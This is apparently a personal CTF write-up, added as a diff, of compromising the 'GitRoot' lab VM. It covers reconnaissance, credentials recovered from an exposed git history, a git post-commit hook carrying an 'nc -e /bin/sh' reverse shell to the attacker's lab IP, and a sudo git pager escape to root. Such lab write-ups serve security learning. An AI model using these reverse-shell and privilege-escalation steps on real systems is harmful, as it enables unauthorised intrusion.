@@ -1,1 +1,276 @@
-11211
+PORT      STATE SERVICE   VERSION
+80/tcp    open  http      Apache httpd 2.4.38 ((Debian))
+|_http-title: Hey Jen
+|_http-server-header: Apache/2.4.38 (Debian)
+11211/tcp open  memcache?
+| fingerprint-strings: 
+|   RPCCheck: 
+|_    Unknown command
+
+//on port 80:
+
+Hey Jen, just installed wordpress over at wp.gitroot.vuln
+please go check it out! 
+
+
+wpscan --url wp.gitroot.vuln -e
+  [+] beth
+   | Found By: Author Posts - Display Name (Passive Detection)
+   | Confirmed By:
+   |  Rss Generator (Passive Detection)
+   |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+   |  Login Error Messages (Aggressive Detection)
+
+└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -u http://192.168.56.103 -H "HOST: FUZZ.gitroot.vuln" -fw 18
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.56.103
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+ :: Header           : Host: FUZZ.gitroot.vuln
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 18
+________________________________________________
+
+wp                      [Status: 200, Size: 10697, Words: 465, Lines: 132, Duration: 141ms]
+repo                    [Status: 200, Size: 438, Words: 46, Lines: 22, Duration: 2ms]
+:: Progress: [207643/207643] :: Job [1/1] :: 6410 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
+
+
+─$ dirsearch -u http://repo.gitroot.vuln
+[23:09:34] 200 -   73B  - /.git/description
+[23:09:34] 200 -   23B  - /.git/HEAD
+[23:09:34] 200 -  469B  - /.git/COMMIT_EDITMSG
+[23:09:34] 200 -  569B  - /.git/index
+[23:09:34] 403 -  282B  - /.git/info/
+[23:09:34] 200 -  240B  - /.git/info/exclude
+[23:09:34] 403 -  282B  - /.git/logs/
+[23:09:34] 301 -  337B  - /.git/logs/refs/heads  ->  http://repo.gitroot.vuln/.git/logs/refs/heads/
+[23:09:34] 301 -  331B  - /.git/logs/refs  ->  http://repo.gitroot.vuln/.git/logs/refs/
+[23:09:34] 200 -  891B  - /.git/logs/refs/heads/master
+[23:09:34] 200 -  891B  - /.git/logs/HEAD
+[23:09:34] 403 -  282B  - /.git/objects/
+[23:09:34] 403 -  282B  - /.git/refs/
+[23:09:34] 301 -  332B  - /.git/refs/heads  ->  http://repo.gitroot.vuln/.git/refs/heads/
+[23:09:34] 301 -  331B  - /.git/refs/tags  ->  http://repo.gitroot.vuln/.git/refs/tags/
+[23:09:34] 200 -   41B  - /.git/refs/heads/master
+
+//on page /.git/logs/refs/heads/master, we got a user pablo
+0000000000000000000000000000000000000000 9ca43fb2bc47e82b4addbba42f38eacbd6fcb588 root <pablo@gitroot.vuln> 1590456757 -0400	commit (initial): added index
+9ca43fb2bc47e82b4addbba42f38eacbd6fcb588 b35845fa33144640c092aa3776ab3d59951688c9 root <pablo@gitroot.vuln> 1590456830 -0400	commit: added get
+b35845fa33144640c092aa3776ab3d59951688c9 b069fdde4cf12980175c3fbd79316fe42b57e19a root <pablo@gitroot.vuln> 1590456839 -0400	commit: added set
+b069fdde4cf12980175c3fbd79316fe42b57e19a ce3843e497dd28f992250d36ee1b4e8c9e0f18e9 root <pablo@gitroot.vuln> 1590456874 -0400	commit: added stats
+ce3843e497dd28f992250d36ee1b4e8c9e0f18e9 e4e93b41309b7f2d7adab20bcff048a93f7444c0 root <pablo@gitroot.vuln> 1590456885 -0400	commit: I need help
+e4e93b41309b7f2d7adab20bcff048a93f7444c0 a4e7f0852ebe819f3aba9419198a74990b6992c0 root <pablo@gitroot.vuln> 1590460703 -0400	commit: added some important stuff
+
+
+//no handy info, try to brute force ssh and wp-admin page， bacause from wpscan, there is no plugins, so try ssh first, hydra used.
+//the ssh port set login limitation, the max concurrency threads are 8. it is impossible to run all the lines in rockyou list....
+//but from the walkthrough, the passwd for pablo is mastergitar
+
+pablo@GitRoot:/opt/auth/.git$ cat /home/pablo/public/message.txt 
+Hey pablo
+
+Make sure to check-out our brand new git repo!
+
+// so we try to find git repo here.
+pablo@GitRoot:/tmp$ find / -name '.git' 2>/dev/null
+/tmp/.git
+/opt/auth/.git
+/var/www/repo/.git
+
+//under logs, we find a commit add stuff, git show to read the content
+pablo@GitRoot:/opt/auth/.git/logs$ cat HEAD | grep -v moving | grep -v init
+b2ab5f540baab4c299306e16f077d7a6f6556ca3 06fbefc1da56b8d552cfa299924097ba1213dd93 Your Name <you@example.com> 1590500148 -0400	commit: added some stuff
+
+pablo@GitRoot:/opt/auth/.git/logs$ git show 06fbefc1da56b8d552cfa299924097ba1213dd93
+commit 06fbefc1da56b8d552cfa299924097ba1213dd93
+Author: Your Name <you@example.com>
+Date:   Tue May 26 09:35:48 2020 -0400
+
+    added some stuff
+
+diff --git a/main.c b/main.c
+index 70e6397..8af9b9c 100644
+--- a/main.c
++++ b/main.c
+@@ -4,6 +4,15 @@
+ int main(){
+ 
+         char pass[20];
+-       return 0;
++        scanf("%20s", pass);
++        printf("You put %s\n", pass);
++        if (strcmp(pass, "r3vpdmspqdb") == 0 ){
++                char *cmd[] = { "bash", (char *)0 };
++                execve("/bin/bash", cmd, (char *) 0);
++        }
++        else{
++                puts("BAD PASSWORD");
++        }
++        return 0;
+ }
+-//43
++
+// so, we got a passwd, "r3vpdmspqdb" , try to login , it works for beth
+pablo@GitRoot:/opt/auth/.git$ su beth
+Password: 
+cat addToMyRepo.txt 
+Hello Beth
+
+If you want to commit to my repository you can add a zip file to ~jen/public/repos/ and ill unzip it and add it to my repository
+
+Thanks!
+
+//let's check the privi of these folders, other have write and run rights.  guess jen has a script to unzip the file othter put into the repos
+
+beth@GitRoot:~/public$ ls -la /home/jen
+total 44
+drwxr-xr-x 5 jen  jen  4096 May 26  2020 .
+drwxr-xr-x 5 root root 4096 May 26  2020 ..
+lrwxrwxrwx 1 jen  jen     9 May 26  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 jen  jen   220 May 26  2020 .bash_logout
+-rw-r--r-- 1 jen  jen  3526 May 26  2020 .bashrc
+-rw-r--r-- 1 jen  jen    50 May 26  2020 .gitconfig
+drwxr-xr-x 3 jen  jen  4096 May 26  2020 .local
+-rw-r--r-- 1 jen  jen   807 May 26  2020 .profile
+-rw-r--r-- 1 jen  jen    75 May 26  2020 .selected_editor
+-rw------- 1 jen  jen   920 May 26  2020 .viminfo
+drwx------ 3 jen  jen  4096 May 26  2020 private
+drwx-wx-wx 3 jen  jen  4096 May 26  2020 public
+
+//from Gtforbins, git/shell git init "$TF"
+  echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
+  mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
+// this folder can be used to run a shell for us.
+beth@GitRoot:/tmp$ echo 'nc -e /bin/sh 192.168.56.105 8821' > /tmp/.git/hooks/post-commit
+beth@GitRoot:/tmp$ 7z a 1.zip .git
+beth@GitRoot:/tmp$ cp 1.zip /home/jen/public/repos/1.zip
+//after listen on the host, we get a shell from account jen.
+jen@GitRoot:~/private$ cat add.sh 
+rm -rf /home/jen/private/repo/.git/
+cd /home/jen/private/repo/
+git init
+7za x -aos -o/home/jen/private/repo/ ~jen/public/repos/*
+git add .
+git commit --allow-empty -m "Thanks beth!"
+rm -f /home/jen/public/repos/*
+//and we find the script for unzip
+//then find a special file , and get a string like passwd binzpbeocnexoe, and the result is positive.
+jen@GitRoot:~$ cat .viminfo
+cat .viminfo
+# This viminfo file was generated by Vim 8.1.
+# You may edit it if you're careful!
+
+# Viminfo version
+|1,4
+
+# Value of 'encoding' when this file was written
+*encoding=utf-8
+
+
+# hlsearch on (H) or off (h):
+~h
+# Command Line History (newest to oldest):
+:wq
+|2,0,1590471909,,"wq"
+:q!
+|2,0,1590471893,,"q!"
+:Q!
+|2,0,1590471892,,"Q!"
+
+# Search String History (newest to oldest):
+?/binzpbeocnexoe
+|2,1,1590471908,47,"binzpbeocnexoe"
+
+# Expression History (newest to oldest):
+
+# Input Line History (newest to oldest):
+
+# Debug Line History (newest to oldest):
+
+# Registers:
+
+# File marks:
+'0  1  0  ~/test.txt
+|4,48,1,0,1590471909,"~/test.txt"
+'1  1  0  ~/test.txt
+|4,49,1,0,1590471893,"~/test.txt"
+
+# Jumplist (newest first):
+-'  1  0  ~/test.txt
+|4,39,1,0,1590471909,"~/test.txt"
+-'  1  0  ~/test.txt
+|4,39,1,0,1590471893,"~/test.txt"
+
+# History of marks within files (newest to oldest):
+
+> ~/test.txt
+        *       1590471908      0
+        "       1       0
+jen@GitRoot:~/private/repo/.git$ sudo -l
+[sudo] password for jen: 
+Matching Defaults entries for jen on GitRoot:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jen may run the following commands on GitRoot:
+    (ALL) /usr/bin/git
+//alspo from gtfobins, git/sudo  This invokes the default pager, which is likely to be less, other functions may apply.
+en@GitRoot:~$ sudo git -p help config
+man: can't set the locale; make sure $LC_* and $LANG are correct
+GIT-CONFIG(1)                                                                  Git Manual                                                                 GIT-CONFIG(1)
+
+NAME
+       git-config - Get and set repository or global options
+
+SYNOPSIS
+       git config [<file-option>] [--type=<type>] [--show-origin] [-z|--null] name [value [value_regex]]
+       git config [<file-option>] [--type=<type>] --add name value
+       git config [<file-option>] [--type=<type>] --replace-all name value [value_regex]
+       git config [<file-option>] [--type=<type>] [--show-origin] [-z|--null] --get name [value_regex]
+       git config [<file-option>] [--type=<type>] [--show-origin] [-z|--null] --get-all name [value_regex]
+       git config [<file-option>] [--type=<type>] [--show-origin] [-z|--null] [--name-only] --get-regexp name_regex [value_regex]
+       git config [<file-option>] [--type=<type>] [-z|--null] --get-urlmatch name URL
+       git config [<file-option>] --unset name [value_regex]
+       git config [<file-option>] --unset-all name [value_regex]
+       git config [<file-option>] --rename-section old_name new_name
+       git config [<file-option>] --remove-section name
+       git config [<file-option>] [--show-origin] [-z|--null] [--name-only] -l | --list
+       git config [<file-option>] --get-color name [default]
+       git config [<file-option>] --get-colorbool name [stdout-is-tty]
+       git config [<file-option>] -e | --edit
+
+DESCRIPTION
+       You can query/set/replace/unset options with this command. The name is actually the section and the key separated by a dot, and the value will be escaped.
+
+       Multiple lines can be added to an option by using the --add option. If you want to update or unset an option which can occur on multiple lines, a POSIX regexp
+       value_regex needs to be given. Only the existing values that match the regexp are updated or unset. If you want to handle the lines that do not match the regex,
+       just prepend a single exclamation mark in front (see also the section called <E2><80><9C>EXAMPLES<E2><80><9D>).
+
+       The --type=<type> option instructs git config to ensure that incoming and outgoing values are canonicalize-able under the given <type>. If no --type=<type> is
+       given, no canonicalization will be performed. Callers may unset an existing --type specifier with --no-type.
+
+       When reading, the values are read from the system, global and repository local configuration files by default, and options --system, --global, --local,
+       --worktree and --file <filename> can be used to tell the command to read from only that location (see the section called <E2><80><9C>FILES<E2><80><9D>).
+
+       When writing, the new value is written to the repository local configuration file by default, and options --system, --global, --worktree, --file <filename> can
+       be used to tell the command to write to that location (you can say --local but that is the default).
+
+:!/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
